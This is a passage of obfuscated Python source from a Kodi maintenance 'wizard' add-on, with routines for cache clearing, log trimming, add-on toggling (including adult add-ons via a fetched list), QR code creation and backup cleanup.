    OOO000000O00OO000 =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:1362
    OOOO0OO00000OOO0O =[(OO0O0OO0OO0OOO000 ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'script.module.simple.downloader')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (OO0O0OO0OO0OOO000 ,'script.module.simple.downloader')),(os .path .join (OO0O0OO0OO0OOO000 ,'plugin.video.itv','Images'))]#line:1373
    O000OO0OOO0O000O0 =0 #line:1375
    for OOO000OO0O0OO0O00 in OOOO0OO00000OOO0O :#line:1377
        if os .path .exists (OOO000OO0O0OO0O00 )and not OOO000OO0O0OO0O00 in [ADDONDATA ,OO0O0OO0OO0OOO000 ]:#line:1378
            O000OO0OOO0O000O0 =getSize (OOO000OO0O0OO0O00 ,O000OO0OOO0O000O0 )#line:1379
        else :#line:1380
            for O0O0O0OO00O0000OO ,OO0O0O0O0000OO00O ,OOOOOOOO0O0OO000O in os .walk (OOO000OO0O0OO0O00 ):#line:1381
                for OO0O0O0OO0OOOO0OO in OO0O0O0O0000OO00O :#line:1382
                    if 'cache'in OO0O0O0OO0OOOO0OO .lower ()and not OO0O0O0OO0OOOO0OO .lower ()=='meta_cache':O000OO0OOO0O000O0 =getSize (os .path .join (O0O0O0OO00O0000OO ,OO0O0O0OO0OOOO0OO ),O000OO0OOO0O000O0 )#line:1383
    if INCLUDEVIDEO =='true':#line:1385
        OOOOOOOO0O0OO000O =[]#line:1386
        if INCLUDEALL =='true':OOOOOOOO0O0OO000O =OOO000000O00OO000 #line:1387
        else :#line:1388
            if INCLUDEBOB =='true':OOOOOOOO0O0OO000O .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:1389
            if INCLUDEPHOENIX =='true':OOOOOOOO0O0OO000O .append (os .path .join (ADDONDATA ,'plugin.video.phstreams','cache.db'))#line:1390
            if INCLUDESPECTO =='true':OOOOOOOO0O0OO000O .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:1391
            if INCLUDEGENESIS =='true':OOOOOOOO0O0OO000O .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:1392
            if INCLUDEEXODUS =='true':OOOOOOOO0O0OO000O .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:1393
            if INCLUDEONECHAN =='true':OOOOOOOO0O0OO000O .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:1394
            if INCLUDESALTS =='true':OOOOOOOO0O0OO000O .append (os .path .join (DATABASE ,'saltscache.db'))#line:1395
            if INCLUDESALTSHD =='true':OOOOOOOO0O0OO000O .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:1396
        if len (OOOOOOOO0O0OO000O )>0 :#line:1397
            for OOO000OO0O0OO0O00 in OOOOOOOO0O0OO000O :O000OO0OOO0O000O0 =getSize (OOO000OO0O0OO0O00 ,O000OO0OOO0O000O0 )#line:1398
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:1399
    return O000OO0OOO0O000O0 #line:1400
def getInfo (O0O000O000000OO0O ):#line:1402
    try :return xbmc .getInfoLabel (O0O000O000000OO0O )#line:1403
    except :return False #line:1404
def removeFolder (O00O0O00OO00O0O0O ):#line:1406
    log ("Deleting Folder: %s"%O00O0O00OO00O0O0O ,5 )#line:1407
    try :shutil .rmtree (O00O0O00OO00O0O0O ,ignore_errors =True ,onerror =None )#line:1408
    except :return False #line:1409
def removeFile (OOOOOOOO000O00OO0 ):#line:1411
    log ("Deleting File: %s"%OOOOOOOO000O00OO0 ,5 )#line:1412
    try :os .remove (OOOOOOOO000O00OO0 )#line:1413
    except :return False #line:1414
def currSkin ():#line:1416
    return xbmc .getSkinDir ()#line:1417
def cleanHouse (O0O000O000OO00000 ,ignore =False ):#line:1419
    log (O0O000O000OO00000 )#line:1420
    OO0O0OOO000O00O0O =0 ;OOOO0O0OOOO00O0OO =0 #line:1421
    for OO00O0OO0O00OOO0O ,O0O0000O00OOOO0O0 ,OOO0OO000O0OO00OO in os .walk (O0O000O000OO00000 ):#line:1422
        if ignore ==False :O0O0000O00OOOO0O0 [:]=[O0OO00OO000OOOO00 for O0OO00OO000OOOO00 in O0O0000O00OOOO0O0 if O0OO00OO000OOOO00 not in EXCLUDES ]#line:1423
        O0000O000O000OO0O =0 #line:1424
        O0000O000O000OO0O +=len (OOO0OO000O0OO00OO )#line:1425
        if O0000O000O000OO0O >=0 :#line:1426
            for OO0000O0OOOO0OOOO in OOO0OO000O0OO00OO :#line:1427
                try :#line:1428
                    os .unlink (os .path .join (OO00O0OO0O00OOO0O ,OO0000O0OOOO0OOOO ))#line:1429
                    OO0O0OOO000O00O0O +=1 #line:1430
                except :#line:1431
                    try :#line:1432
                        shutil .rmtree (os .path .join (OO00O0OO0O00OOO0O ,OO0000O0OOOO0OOOO ))#line:1433
                    except :#line:1434
                        log ("Error Deleting %s"%OO0000O0OOOO0OOOO ,5 )#line:1435
            for OOOO000OOO0OO000O in O0O0000O00OOOO0O0 :#line:1436
                OOOO0O0OOOO00O0OO +=1 #line:1437
                try :#line:1438
                    shutil .rmtree (os .path .join (OO00O0OO0O00OOO0O ,OOOO000OOO0OO000O ))#line:1439
                    OOOO0O0OOOO00O0OO +=1 #line:1440
                except :#line:1441
                    log ("Error Deleting %s"%OOOO000OOO0OO000O ,5 )#line:1442
    return OO0O0OOO000O00O0O ,OOOO0O0OOOO00O0OO #line:1443
def emptyfolder (O000OO0O0O0O0000O ):#line:1445
    OOO0OO000O0O00000 =0 #line:1446
    for OO0O0O0O0000000O0 ,O000OOO0OO00O0O00 ,OOO00000O0OO000O0 in os .walk (O000OO0O0O0O0000O ,topdown =True ):#line:1447
        O000OOO0OO00O0O00 [:]=[OOO0O0O000O00OO0O for OOO0O0O000O00OO0O in O000OOO0OO00O0O00 if OOO0O0O000O00OO0O not in EXCLUDES ]#line:1448
        OOO00O00O000OO00O =0 #line:1449
        OOO00O00O000OO00O +=len (OOO00000O0OO000O0 )+len (O000OOO0OO00O0O00 )#line:1450
        if OOO00O00O000OO00O ==0 :#line:1451
            shutil .rmtree (os .path .join (OO0O0O0O0000000O0 ))#line:1452
            OOO0OO000O0O00000 +=1 #line:1453
            log ("Empty Folder: %s"%OO0O0O0O0000000O0 ,5 )#line:1454
    return OOO0OO000O0O00000 #line:1455
def log (O0000OO0OOOOOO00O ,level =5 ):#line:1457
    if not os .path .exists (ADDONDATA ):#line:1459
      try :#line:1460
        os .makedirs (ADDONDATA )#line:1461
      except :pass #line:1462
    if not os .path .exists (WIZLOG ):O0O00O0O0OO00O0OO =open (WIZLOG ,'w');O0O00O0O0OO00O0OO .close ()#line:1463
    if WIZDEBUGGING =='false':return False #line:1464
    if DEBUGLEVEL =='0':return False #line:1465
    if DEBUGLEVEL =='1'and not level in [5 ,5 ,xbmc .LOGSEVERE ,xbmc .LOGFATAL ]:return False #line:1466
    if DEBUGLEVEL =='2':level =5 #line:1467
    try :#line:1468
        try :#line:1469
            if isinstance (O0000OO0OOOOOO00O ,unicode ):#line:1470
                O0000OO0OOOOOO00O ='%s'%(O0000OO0OOOOOO00O .encode ('utf-8'))#line:1471
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0000OO0OOOOOO00O ),level )#line:1472
        except :#line:1473
            if isinstance (O0000OO0OOOOOO00O ,str ):#line:1474
                O0000OO0OOOOOO00O ='%s'%(O0000OO0OOOOOO00O .encode ('utf-8'))#line:1475
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0000OO0OOOOOO00O ),level )#line:1476
    except Exception as OOO0000O0O000OOOO :#line:1477
        try :xbmc .log ('Logging Failure: %s'%(OOO0000O0O000OOOO ),level )#line:1478
        except :pass #line:1479
    if ENABLEWIZLOG =='true':#line:1480
        O0OO00O00OO0O000O =getS ('nextcleandate')if not getS ('nextcleandate')==''else str (TODAY )#line:1481
        if CLEANWIZLOG =='true'and O0OO00O00OO0O000O <=str (TODAY ):checkLog ()#line:1482
        with open (WIZLOG ,'a')as O0O00O0O0OO00O0OO :#line:1483
            O00O000OOO00O0OOO ="[%s %s] %s"%(datetime .now ().date (),str (datetime .now ().time ())[:8 ],O0000OO0OOOOOO00O )#line:1484
            O0O00O0O0OO00O0OO .write (O00O000OOO00O0OOO .rstrip ('\r\n')+'\n')#line:1485
def checkLog ():#line:1487
    try :#line:1488
        OOOOOOO00O0OO0OOO =getS ('nextcleandate')#line:1489
        OO00OOO00OO0OO0O0 =TOMORROW #line:1490
        if CLEANWIZLOGBY =='0':#line:1491
            OOOOOO0O00OOO00O0 =TODAY -timedelta (days =MAXWIZDATES [int (float (CLEANDAYS ))])#line:1492
            OOO0OO0OOO0O0OO00 =0 #line:1493
            O0O00OO0OOOOO0O0O =open (WIZLOG );O0O0OO0O0OO0OOOOO =O0O00OO0OOOOO0O0O .read ();O0O00OO0OOOOO0O0O .close ();OO0000O0OO00OO0O0 =O0O0OO0O0OO0OOOOO .split ('\n')#line:1494
            for O00O00OO000O0O000 in OO0000O0OO00OO0O0 :#line:1495
                if str (O00O00OO000O0O000 [1 :11 ])>=str (OOOOOO0O00OOO00O0 ):#line:1496
                    break #line:1497
                OOO0OO0OOO0O0OO00 +=1 #line:1498
            O0OO000OO0OO0O00O =OO0000O0OO00OO0O0 [OOO0OO0OOO0O0OO00 :]#line:1499
            OO00O0OOOOO00OOO0 ='\n'.join (O0OO000OO0OO0O00O )#line:1500
            O0O00OO0OOOOO0O0O =open (WIZLOG ,'w');O0O00OO0OOOOO0O0O .write (OO00O0OOOOO00OOO0 );O0O00OO0OOOOO0O0O .close ()#line:1501
        elif CLEANWIZLOGBY =='1':#line:1502
            O0O0OO0000O000OO0 =MAXWIZSIZE [int (float (CLEANSIZE ))]*1024 #line:1503
            O0O00OO0OOOOO0O0O =open (WIZLOG );O0O0OO0O0OO0OOOOO =O0O00OO0OOOOO0O0O .read ();O0O00OO0OOOOO0O0O .close ();OO0000O0OO00OO0O0 =O0O0OO0O0OO0OOOOO .split ('\n')#line:1504
            if os .path .getsize (WIZLOG )>=O0O0OO0000O000OO0 :#line:1505
                OOOOOO00000000000 =len (OO0000O0OO00OO0O0 )/2 #line:1506
                O0OO000OO0OO0O00O =OO0000O0OO00OO0O0 [OOOOOO00000000000 :]#line:1507
                OO00O0OOOOO00OOO0 ='\n'.join (O0OO000OO0OO0O00O )#line:1508
                O0O00OO0OOOOO0O0O =open (WIZLOG ,'w');O0O00OO0OOOOO0O0O .write (OO00O0OOOOO00OOO0 );O0O00OO0OOOOO0O0O .close ()#line:1509
        elif CLEANWIZLOGBY =='2':#line:1510
            O0O00OO0OOOOO0O0O =open (WIZLOG );O0O0OO0O0OO0OOOOO =O0O00OO0OOOOO0O0O .read ();O0O00OO0OOOOO0O0O .close ();OO0000O0OO00OO0O0 =O0O0OO0O0OO0OOOOO .split ('\n')#line:1511
            OOO00OOOOOO0OOOOO =MAXWIZLINES [int (float (CLEANLINES ))]#line:1512
            if len (OO0000O0OO00OO0O0 )>OOO00OOOOOO0OOOOO :#line:1513
                OOOOOO00000000000 =len (OO0000O0OO00OO0O0 )-int (OOO00OOOOOO0OOOOO /2 )#line:1514
                O0OO000OO0OO0O00O =OO0000O0OO00OO0O0 [OOOOOO00000000000 :]#line:1515
                OO00O0OOOOO00OOO0 ='\n'.join (O0OO000OO0OO0O00O )#line:1516
                O0O00OO0OOOOO0O0O =open (WIZLOG ,'w');O0O00OO0OOOOO0O0O .write (OO00O0OOOOO00OOO0 );O0O00OO0OOOOO0O0O .close ()#line:1517
        setS ('nextcleandate',str (OO00OOO00OO0OO0O0 ))#line:1518
    except :pass #line:1519
def latestDB (OO0O000O0O0OO0OO0 ):#line:1520
    if OO0O000O0O0OO0OO0 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:1521
        OOOO0O0OO0OOOOOO0 =glob .glob (os .path .join (DATABASE ,'%s*.db'%OO0O000O0O0OO0OO0 ))#line:1522
        OOOO0OO0O0OOOO0OO ='%s(.+?).db'%OO0O000O0O0OO0OO0 [1 :]#line:1523
        O0OOO0OOO00O00O00 =0 #line:1524
        for O0O0O0OO00OO00OO0 in OOOO0O0OO0OOOOOO0 :#line:1525
            try :O0O000000000O0O0O =int (re .compile (OOOO0OO0O0OOOO0OO ).findall (O0O0O0OO00OO00OO0 )[0 ])#line:1526
            except :O0O000000000O0O0O =0 #line:1527
            if O0OOO0OOO00O00O00 <O0O000000000O0O0O :#line:1528
                O0OOO0OOO00O00O00 =O0O000000000O0O0O #line:1529
        return '%s%s.db'%(OO0O000O0O0OO0OO0 ,O0OOO0OOO00O00O00 )#line:1530
    else :return False #line:1531
def addonId (OO000O0O0OOO0000O ):#line:1533
    try :#line:1534
        return xbmcaddon .Addon (id =OO000O0O0OOO0000O )#line:1535
    except :#line:1536
        return False #line:1537
def toggleDependency (O000O0OO00O000OOO ,DP =None ):#line:1539
    O00O0O0O000O0OOO0 =os .path .join (ADDONS ,O000O0OO00O000OOO ,'addon.xml')#line:1540
    if os .path .exists (O00O0O0O000O0OOO0 ):#line:1541
        O0O00OOO000OOO0O0 =open (O00O0O0O000O0OOO0 ,mode ='r');O0OO0OOOOOO0O000O =O0O00OOO000OOO0O0 .read ();O0O00OOO000OOO0O0 .close ();#line:1542
        O00000OO00O000O0O =parseDOM (O0OO0OOOOOO0O000O ,'import',ret ='addon')#line:1543
        for OOO0O00O0O0OOO0O0 in O00000OO00O000O0O :#line:1544
            if not 'xbmc.python'in OOO0O00O0O0OOO0O0 :#line:1545
                O00O00OOOO0000OOO =os .path .join (ADDONS ,OOO0O00O0O0OOO0O0 )#line:1546
                if not DP ==None :#line:1547
                    DP .update ("","Checking Dependency [COLOR yellow]%s[/COLOR] for [COLOR yellow]%s[/COLOR]"%(OOO0O00O0O0OOO0O0 ,O000O0OO00O000OOO ),"")#line:1548
                if os .path .exists (O00O00OOOO0000OOO ):#line:1549
                    toggleAddon (O000O0OO00O000OOO ,'true')#line:1550
            xbmc .sleep (100 )#line:1551
def toggleAdult ():#line:1553
    OO00000OO00OO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Enable[/COLOR] or [COLOR %s]Disable[/COLOR] all Adult addons?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Enable[/COLOR][/B]",nolabel ="[B][COLOR red]Disable[/COLOR][/B]")#line:1554
    O00O000OOO000OOOO ='true'if OO00000OO00OO000O ==1 else 'false'#line:1555
    OO000O0O00000OOOO ='Enabling'if OO00000OO00OO000O ==1 else 'Disabling'#line:1556
    O0OOO0OO0000O00O0 =openURL ('http://noobsandnerds.com/TI/AddonPortal/adult.php').replace ('\n','').replace ('\r','').replace ('\t','')#line:1557
    OO0O0OO0O0O0O00O0 =re .compile ('i="(.+?)"').findall (O0OOO0OO0000O00O0 )#line:1558
    O0O00O0O00OOO0OO0 =[]#line:1559
    for O000OOOOOOO00O0O0 in OO0O0OO0O0O0O00O0 :#line:1560
        O00O0OOO000O000O0 =os .path .join (ADDONS ,O000OOOOOOO00O0O0 )#line:1561
        if os .path .exists (O00O0OOO000O000O0 ):#line:1562
            O0O00O0O00OOO0OO0 .append (O000OOOOOOO00O0O0 )#line:1563
            toggleAddon (O000OOOOOOO00O0O0 ,O00O000OOO000OOOO ,True )#line:1564
            log ("[Toggle Adult] %s %s"%(OO000O0O00000OOOO ,O000OOOOOOO00O0O0 ),5 )#line:1565
    if len (O0O00O0O00OOO0OO0 )>0 :#line:1566
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to view a list of the addons that where %s?[/COLOR]"%(COLOR2 ,OO000O0O00000OOOO .replace ('ing','ed')),yeslabel ="[B][COLOR green]View List[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1567
            OOO000OO0O0O0O00O ='[CR]'.join (O0O00O0O00OOO0OO0 )#line:1568
            TextBox (ADDONTITLE ,"[COLOR %s]Here are a list of the addons that where %s for Adult Content:[/COLOR][CR][CR][COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0O00000OOOO .replace ('ing','ed'),COLOR2 ,OOO000OO0O0O0O00O ))#line:1569
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s][COLOR %s]%d[/COLOR] Adult Addons %s[/COLOR]"%(COLOR2 ,COLOR1 ,count ,OO000O0O00000OOOO .replace ('ing','ed')))#line:1570
        forceUpdate (True )#line:1571
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Adult Addons Found[/COLOR]"%COLOR2 )#line:1572
def toggleAddon (OOO00000OO0O0O00O ,OO0OOO0OOO00000OO ,over =None ):#line:1575
    if KODIV >=17 :#line:1576
        addonDatabase (OOO00000OO0O0O00O ,OO0OOO0OOO00000OO )#line:1577
        return #line:1578
    O0O00O0O000OOOOO0 =OOO00000OO0O0O00O #line:1579
    O00OO00OO0O0OOOO0 =os .path .join (ADDONS ,OOO00000OO0O0O00O ,'addon.xml')#line:1580
    if os .path .exists (O00OO00OO0O0OOOO0 ):#line:1581
        OOOO0OOOOO0OOO0O0 =open (O00OO00OO0O0OOOO0 )#line:1582
        OOO0OO000OOOOO000 =OOOO0OOOOO0OOO0O0 .read ()#line:1583
        O00O00OOO00OO0OO0 =parseDOM (OOO0OO000OOOOO000 ,'addon',ret ='id')#line:1584
        OO00O0O0OOOO0OOO0 =parseDOM (OOO0OO000OOOOO000 ,'addon',ret ='name')#line:1585
        OO0OOO00000O0000O =parseDOM (OOO0OO000OOOOO000 ,'extension',ret ='library',attrs ={'point':'xbmc.service'})#line:1586
        try :#line:1587
            if len (O00O00OOO00OO0OO0 )>0 :#line:1588
                O0O00O0O000OOOOO0 =O00O00OOO00OO0OO0 [0 ]#line:1589
            if len (OO0OOO00000O0000O )>0 :#line:1590
                log ("We got a live one, stopping script: %s"%match [0 ],5 )#line:1591
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,O0O00O0O000OOOOO0 ))#line:1592
                ebi ('StopScript(%s)'%O0O00O0O000OOOOO0 )#line:1593
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,O0O00O0O000OOOOO0 ,OO0OOO00000O0000O [0 ]))#line:1594
                xbmc .sleep (500 )#line:1595
        except :#line:1596
            pass #line:1597
    O0000O0000OO0O0OO ='{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}'%(O0O00O0O000OOOOO0 ,OO0OOO0OOO00000OO )#line:1598
    O00OOOOOOOOO0O00O =xbmc .executeJSONRPC (O0000O0000OO0O0OO )#line:1599
    if 'error'in O00OOOOOOOOO0O00O and over ==None :#line:1600
        OO0OO0O00OOO0OO00 ='Enabling'if OO0OOO0OOO00000OO =='true'else 'Disabling'#line:1601
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error %s [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OO0O00OOO0OO00 ,OOO00000OO0O0O00O ),"Check to make sure the addon list is upto date and try again.[/COLOR]")#line:1602
        forceUpdate ()#line:1603
def addonInfo (OO0O0OO0OO0O000O0 ,O00O00OO0O000000O ):#line:1605
    O00O00O00OOOO0OOO =addonId (OO0O0OO0OO0O000O0 )#line:1606
    if O00O00O00OOOO0OOO :return O00O00O00OOOO0OOO .getAddonInfo (O00O00OO0O000000O )#line:1607
    else :return False #line:1608
def whileWindow (O0000O0O0O00OOO0O ,active =False ,count =0 ,counter =15 ):#line:1610
    O0OOO0O0OO000O000 =getCond ('Window.IsActive(%s)'%O0000O0O0O00OOO0O )#line:1611
    log ("%s is %s"%(O0000O0O0O00OOO0O ,O0OOO0O0OO000O000 ),5 )#line:1612
    while not O0OOO0O0OO000O000 and count <counter :#line:1613
        log ("%s is %s(%s)"%(O0000O0O0O00OOO0O ,O0OOO0O0OO000O000 ,count ))#line:1614
        O0OOO0O0OO000O000 =getCond ('Window.IsActive(%s)'%O0000O0O0O00OOO0O )#line:1615
        count +=1 #line:1616
        xbmc .sleep (500 )#line:1617
    while O0OOO0O0OO000O000 :#line:1619
        active =True #line:1620
        log ("%s is %s"%(O0000O0O0O00OOO0O ,O0OOO0O0OO000O000 ),5 )#line:1621
        O0OOO0O0OO000O000 =getCond ('Window.IsActive(%s)'%O0000O0O0O00OOO0O )#line:1622
        xbmc .sleep (250 )#line:1623
    return active #line:1624
def id_generator (size =6 ,chars =string .ascii_uppercase +string .digits ):#line:1626
    return ''.join (random .choice (chars )for _OO0O000O0O0OOO00O in range (size ))#line:1627
def generateQR (O00OOO0O0000OOOO0 ,OOO0000O000OO0OO0 ):#line:1629
    if not os .path .exists (QRCODES ):os .makedirs (QRCODES )#line:1630
    O0O00O00O0O0000O0 =os .path .join (QRCODES ,'%s.png'%OOO0000O000OO0OO0 )#line:1631
    OO0OOO00O000OOOO0 =pyqrcode .create (O00OOO0O0000OOOO0 )#line:1632
    OO0OOO00O000OOOO0 .png (O0O00O00O0O0000O0 ,scale =10 )#line:1633
    return O0O00O00O0O0000O0 #line:1634
def createQR ():#line:1636
    O000O00O00O0OOOO0 =getKeyboard ('',"%s: Insert the URL for the QRCode."%ADDONTITLE )#line:1637
    if O000O00O00O0OOOO0 =="":LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Create QR Code Cancelled![/COLOR]'%COLOR2 );return #line:1638
    if not O000O00O00O0OOOO0 .startswith ('http://')and not O000O00O00O0OOOO0 .startswith ('https://'):LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1639
    if O000O00O00O0OOOO0 =='http://'or O000O00O00O0OOOO0 =='https://':LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1640
    OOO0OOO00O000OOOO =workingURL (O000O00O00O0OOOO0 )#line:1641
    if not OOO0OOO00O000OOOO ==True :#line:1642
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems the your enter isnt working, Would you like to create it anyways?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO00O000OOOO ),yeslabel ="[B][COLOR red]Yes Create[/COLOR][/B]",nolabel ="[B][COLOR green]No Cancel[/COLOR][/B]"):#line:1643
            return #line:1644
    OOO00O0OO0000OO00 =getKeyboard ('',"%s: Insert the name for the QRCode."%ADDONTITLE )#line:1645
    OOO00O0OO0000OO00 ="QrImage_%s"%id_generator (6 )if OOO00O0OO0000OO00 ==""else OOO00O0OO0000OO00 #line:1646
    OOO0OOO000000O0O0 =generateQR (O000O00O00O0OOOO0 ,OOO00O0OO0000OO00 )#line:1647
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]The QRCode image has been created and is located in the addondata directory:[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO000000O0O0 .replace (HOME ,'')))#line:1648
def cleanupBackup ():#line:1650
    OOOOOO0O0O00O0OO0 =translatepath (MYBUILDS )#line:1651
    O0O0OOO0OO0OOOO0O =glob .glob (os .path .join (OOOOOO0O0O00O0OO0 ,"*"))#line:1652
    O00OO000O00000OO0 =[];OO0O000OO00OOO00O =[]#line:1653
    if len (O0O0OOO0OO0OOOO0O )==0 :#line:1654
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Backup Location: Empty[/COLOR]"%(COLOR2 ))#line:1655
        return #line:1656
    for O0O0OOOO00O00O0O0 in sorted (O0O0OOO0OO0OOOO0O ,key =os .path .getmtime ):#line:1657
        OO0O000OO00OOO00O .append (O0O0OOOO00O00O0O0 )#line:1658
        O0OO000OO00O0O0O0 =O0O0OOOO00O00O0O0 .replace (OOOOOO0O0O00O0OO0 ,'')#line:1659
        if os .path .isdir (O0O0OOOO00O00O0O0 ):#line:1660
            O00OO000O00000OO0 .append ('/%s/'%O0OO000OO00O0O0O0 )#line:1661
        elif os .path .isfile (O0O0OOOO00O00O0O0 ):#line:1662
            O00OO000O00000OO0 .append (O0OO000OO00O0O0O0 )#line:1663
    O00OO000O00000OO0 =['--- Remove All Items ---']+O00OO000O00000OO0 #line:1664
    O0000OO00000OO0OO =DIALOG .select ("%s: Select the items to remove from 'MyBuilds'."%ADDONTITLE ,O00OO000O00000OO0 )#line:1665
    if O0000OO00000OO0OO ==-1 :#line:1667
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1668
    elif O0000OO00000OO0OO ==0 :#line:1669
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to clean up all items in your 'My_Builds' folder?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,MYBUILDS ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1670
            OOO0000OOO0O000O0 ,O00OO000O0000OO00 =cleanHouse (translatepath (MYBUILDS ))#line:1671
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Removed Files: [COLOR %s]%s[/COLOR] / Folders:[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0000OOO0O000O0 ,COLOR1 ,O00OO000O0000OO00 ))#line:1672
        else :#line:1673
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1674
    else :#line:1675
        OO0O00OOOOOO00OOO =OO0O000OO00OOO00O [O0000OO00000OO0OO -1 ];O0O0OOOOO000O0OO0 =False #line:1676
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove [COLOR %s]%s[/COLOR] from 'My_Builds' folder?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OO000O00000OO0 [O0000OO00000OO0OO ]),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00OOOOOO00OOO ),yeslabel ="[B][COLOR green]Clean Up[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:1677
            if os .path .isfile (OO0O00OOOOOO00OOO ):#line:1678
                try :#line:1679
                    os .remove (OO0O00OOOOOO00OOO )#line:1680
                    O0O0OOOOO000O0OO0 =True #line:1681
                except :#line:1682
                    log ("Unable to remove: %s"%OO0O00OOOOOO00OOO )#line:1683
            else :#line:1684
                cleanHouse (OO0O00OOOOOO00OOO )#line:1685
                try :#line:1686
                    shutil .rmtree (OO0O00OOOOOO00OOO )#line:1687
                    O0O0OOOOO000O0OO0 =True #line:1688
                except Exception as OO000O0OO0OOOOOOO :#line:1689
                    log ("Error removing %s"%OO0O00OOOOOO00OOO ,5 )#line:1690
            if O0O0OOOOO000O0OO0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed![/COLOR]"%(COLOR2 ,O00OO000O00000OO0 [O0000OO00000OO0OO ]))#line:1691
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Removing %s![/COLOR]"%(COLOR2 ,O00OO000O00000OO0 [O0000OO00000OO0OO ]))#line:1692
        else :#line:1693
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clean Up Cancelled![/COLOR]"%COLOR2 )#line:1694
def getCond (O00000OO00O00OOO0 ):#line:1696
    return xbmc .getCondVisibility (O00000OO00O00OOO0 )#line:1697
def ebi (OOOO0OOO000000OO0 ):#line:1699
    xbmc .executebuiltin (OOOO0OOO000000OO0 )#line:1700
def refresh ():#line:1702
    ebi ('Container.Refresh()')#line:1703
def splitNotify (OO0OOO0000O0OOOO0 ):#line:1705
    O00O000OOO00000O0 =openURL (OO0OOO0000O0OOOO0 ).replace ('\r','').replace ('\t','').replace ('\n','[CR]')#line:1706
    if O00O000OOO00000O0 .find ('|||')==-1 :return False ,False #line:1707
    OOOO0O0OO0O0O00O0 ,OO0000O0OOO0000OO =O00O000OOO00000O0 .split ('|||')#line:1708
    if OO0000O0OOO0000OO .startswith ('[CR]'):OO0000O0OOO0000OO =OO0000O0OOO0000OO [4 :]#line:1709
    return OOOO0O0OO0O0O00O0 .replace ('[CR]',''),OO0000O0OOO0000OO #line:1710
def forceUpdate (silent =False ):#line:1712
    ebi ('UpdateAddonRepos()')#line:1713
    ebi ('UpdateLocalAddons()')#line:1714
def convertSpecial (O0OOOOO0OO00000OO ,over =False ):#line:1718
    O00OOOOO0O00000O0 =fileCount (O0OOOOO0OO00000OO );OOO00O0O0OOOOOO0O =0 #line:1719
